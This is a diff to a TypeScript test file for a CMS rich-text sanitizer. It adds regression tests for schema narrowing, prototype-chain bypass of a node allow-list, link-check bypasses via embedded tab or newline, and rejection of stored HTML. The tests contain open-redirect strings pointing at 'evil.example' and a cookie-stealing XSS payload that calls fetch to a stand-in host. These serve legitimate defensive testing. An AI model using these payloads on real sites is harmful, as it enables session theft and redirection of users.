@@ -9,6 +9,7 @@ import {
   DEFAULT_RICH_TEXT_SCHEMA,
   MAX_RICH_TEXT_DEPTH,
   isSafeHref,
+  normalizeHref,
   normalizeFields,
   normalizeRichText,
   richTextToPlainText,
@@ -144,13 +145,55 @@ test("an empty text node is dropped, not stored", () => {
   expect(out.content).toEqual([para(text("kept"))] as RichTextDoc["content"]);
 });
 
-test("a custom richTextSchema reaches the shipped handlers", async () => {
-  const { createCmsHandlers } = await import("@pramen/cms");
-  // The option exists and is accepted — previously normalizeFields took a schema parameter
-  // that no call site inside createCmsHandlers ever passed, so the documented
-  // customization point was unreachable.
-  const handlers = createCmsHandlers({ richTextSchema: { nodes: { doc: [], paragraph: [], text: [] }, marks: {} } });
-  expect(typeof handlers.updateBlock).toBe("object");
+test("a custom richTextSchema actually narrows what is stored", () => {
+  // The previous version of this test only asserted the handler object existed, which
+  // passed even with the option unwired. Exercise the schema itself.
+  const narrow = { nodes: { doc: [], paragraph: [], text: [] }, marks: { bold: [] } };
+  const schema: FieldDefinition[] = [{ name: "body", type: "richtext" }];
+  const input = { body: doc({ type: "heading", attrs: { level: 2 }, content: [text("H")] }, para(text("kept", [{ type: "bold" }]), text("x", [{ type: "highlight" }]))) };
+
+  const wide = normalizeFields(schema, input).body as RichTextDoc;
+  expect(wide.content?.[0].type).toBe("heading"); // default schema keeps it
+
+  const narrowed = normalizeFields(schema, input, narrow).body as RichTextDoc;
+  expect(narrowed.content?.map((n) => n.type)).toEqual(["paragraph"]); // heading dropped
+  expect(narrowed.content?.[0].content?.[0].marks).toEqual([{ type: "bold" }]);
+  expect(narrowed.content?.[0].content?.[1].marks).toBeUndefined(); // highlight dropped
+});
+
+test("the allow-list is not bypassable through the prototype chain", () => {
+  // A plain-object index resolves `constructor`/`toString`/`valueOf` to inherited members,
+  // which are truthy — so these passed the gate, were stored, and then crashed both
+  // renderers and the editor. `{type:"constructor",attrs:{}}` additionally threw a
+  // TypeError inside the DO's storage.transaction() (a 500, not a 400).
+  for (const type of ["constructor", "toString", "valueOf", "hasOwnProperty", "__proto__"]) {
+    expect(normalizeRichText(doc({ type })).content).toEqual([]);
+    expect(() => normalizeRichText(doc({ type, attrs: {} }))).not.toThrow();
+  }
+  const marked = normalizeRichText(doc(para(text("hi", [{ type: "toString" }, { type: "constructor" }]))));
+  expect(marked.content?.[0].content?.[0].marks).toBeUndefined();
+});
+
+test("isSafeHref is not bypassable with an embedded tab or newline", () => {
+  // The URL parser strips ASCII tab/CR/LF before parsing, so these resolve off-site while
+  // passing a prefix test that only inspects the character after the leading slash.
+  for (const href of ["/\r\n/evil.example/x", "/\t/evil.example/x", "/\t\\evil.example/x"]) {
+    expect(new URL(href, "https://site.test/a").host).toBe("evil.example");
+    expect(isSafeHref(href)).toBe(false);
+  }
+  // A tab inside an otherwise fine relative path is stripped, not treated as an escape.
+  expect(normalizeHref("/about\tus ")).toBe("/aboutus");
+});
+
+test("a legacy HTML string is tolerated only when it matches the stored value", () => {
+  const schema: FieldDefinition[] = [{ name: "body", type: "richtext" }];
+  const stored = { body: "<p>what is already in the row</p>" };
+  // Echoing back exactly what is stored is fine — that is the editor's whole-bag autosave.
+  expect(() => validateFields(schema, stored, "", { legacyBaseline: stored })).not.toThrow();
+  // Anything else is rejected. Without this, the dropped `xss` sanitizer meant any caller
+  // could store arbitrary HTML for consumers still rendering with set:html.
+  const attack = { body: "<img src=x onerror=fetch('//evil/'+document.cookie)>" };
+  expect(() => validateFields(schema, attack, "", { legacyBaseline: stored })).toThrow(/not an HTML string/);
 });
 
 test("normalizeRichText caps recursion instead of blowing the stack", () => {
@@ -168,14 +211,13 @@ test("normalizeRichText caps recursion instead of blowing the stack", () => {
   expect(depth).toBeLessThanOrEqual(MAX_RICH_TEXT_DEPTH + 1);
 });
 
-test("a legacy HTML string is tolerated — and kept — only where the bag holds stored data", () => {
+test("a legacy HTML string is kept, not emptied, when it is tolerated", () => {
   const schema: FieldDefinition[] = [{ name: "body", type: "richtext" }];
   const legacy = { body: "<p>stored before the migration</p>" };
   // Default: strict, because the value is new input.
   expect(() => validateFields(schema, legacy)).toThrow(/not an HTML string/);
-  // allowLegacyRichText: the bag carries a row we already stored (placeBlock's merge).
-  expect(() => validateFields(schema, legacy, "", { allowLegacyRichText: true })).not.toThrow();
-  // And normalization must NOT turn it into an empty doc — that would delete the content.
+  // Normalization must NOT turn a tolerated string into an empty doc — that would delete
+  // the very content the tolerance exists to preserve.
   expect(normalizeFields(schema, legacy).body).toBe("<p>stored before the migration</p>");
 });
 
